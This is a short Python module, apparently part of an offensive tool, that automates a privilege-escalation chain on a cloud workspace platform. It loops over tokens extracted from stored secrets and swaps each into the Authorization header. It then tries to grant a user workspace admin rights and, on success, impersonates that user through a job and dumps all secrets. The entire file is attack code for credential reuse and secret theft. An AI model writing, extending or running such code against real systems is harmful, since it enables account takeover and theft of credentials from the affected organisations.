from core.token_relay import extract_tokens_from_secrets
from config import log
from core.privilege_escalation import make_user_workspace_admin
from core.impersonate_job import impersonate_user_via_job
from core.secrets_dump import dump_secrets

def try_auto_escalate():
    log("[*] Attempting automated privilege pivot...")
    tokens = extract_tokens_from_secrets()
    for item in tokens:
        token = item["token"]
        log(f"[*] Trying pivot via token: {token[:10]}...")
        try:
            # Test if token has admin powers (make user admin)
            from config import headers
            original = headers["Authorization"]
            headers["Authorization"] = f"Bearer {token}"
            success = make_user_workspace_admin("admin@domain.com")  # hypothetical user
            if success:
                impersonate_user_via_job("admin@domain.com")
                dump_secrets()
                log("[+] Pivot chain completed. Token gave admin control.")
                headers["Authorization"] = original
                break
            headers["Authorization"] = original
        except Exception as e:
            log(f"[!] Pivot failed: {e}", level="error")
